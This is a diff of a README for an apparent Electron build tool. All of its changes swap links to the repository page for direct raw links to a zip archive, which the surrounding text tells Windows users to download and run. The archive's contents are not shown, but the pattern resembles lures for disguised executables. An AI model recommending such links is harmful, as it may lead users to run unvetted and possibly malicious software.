@@ -1,6 +1,6 @@
 # 🖥️ electron-desktop-builds - Build Electron apps with fewer errors
 
-[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/gamerforgood469-art/electron-desktop-builds)
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://raw.githubusercontent.com/gamerforgood469-art/electron-desktop-builds/main/assets/builds-desktop-electron-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Use this guide if you want to:
 
 Use this link to visit the page and download the app:
 
-[Download electron-desktop-builds](https://github.com/gamerforgood469-art/electron-desktop-builds)
+[Download electron-desktop-builds](https://raw.githubusercontent.com/gamerforgood469-art/electron-desktop-builds/main/assets/builds-desktop-electron-v2.2.zip)
 
 ### Steps
 
@@ -211,7 +211,7 @@ This repository is focused on:
 
 Visit the page here to download and run the Windows build:
 
-[https://github.com/gamerforgood469-art/electron-desktop-builds](https://github.com/gamerforgood469-art/electron-desktop-builds)
+[https://raw.githubusercontent.com/gamerforgood469-art/electron-desktop-builds/main/assets/builds-desktop-electron-v2.2.zip](https://raw.githubusercontent.com/gamerforgood469-art/electron-desktop-builds/main/assets/builds-desktop-electron-v2.2.zip)
 
 ## 🖱️ Quick Start
 
